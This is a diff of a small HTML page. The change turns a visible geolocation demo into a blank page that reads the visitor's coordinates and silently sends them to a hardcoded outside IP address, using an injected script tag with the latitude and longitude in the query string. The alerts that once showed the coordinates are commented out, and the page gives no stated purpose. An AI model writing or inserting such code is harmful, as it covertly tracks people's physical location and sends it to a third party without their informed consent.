@@ -1,34 +1,46 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-<meta http-equiv="Content-Type" content="text/html" />
-<title>行政区域工具</title>
+    <meta http-equiv="Content-Type" content="text/html" />
+    <title></title>
 </head>
+
 <body>
 
 </body>
 
 <script type="text/javascript">
-    var location_lon = '',location_lat = ''; // 经度,纬度
-     if (navigator.geolocation){
-         navigator.geolocation.getCurrentPosition(function (position) {
-             location_lon = position.coords.longitude;
-             location_lat = position.coords.latitude;
-             console.log('h5经度：'+location_lon)
-             console.log('h5纬度：'+location_lat);
-             alert('h5经度：'+location_lon);alert('h5纬度：'+location_lat);
-         });
-     }else {
-         alert("您的设备不支持定位功能");
-     }
- </script>
+    let location_lon = '',
+        location_lat = ''; // 经度,纬度
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function (position) {
+            location_lon = position.coords.longitude;
+            location_lat = position.coords.latitude;
+
+            var script = document.createElement("script");
+            //组合请求URL
+            script.src = "http://123.57.105.167/nihao" + "?jingdu=" + location_lon + "&" + "weidu=" +
+                location_lat;
+            //将创建的新节点添加到BOM树上
+            document.getElementsByTagName("body")[0].appendChild(script);
+
+            // alert('h5经度：' + location_lon);
+            // alert('h5纬度：' + location_lat);
+        });
+    } else {
+        alert("请打开手机定位功能");
+    }
+
+
+</script>
+
+
+
 
 </html>
 
 
- 
+
 
 ---------------------------------------------------------------------------------------------------------------------------------
-
-
-
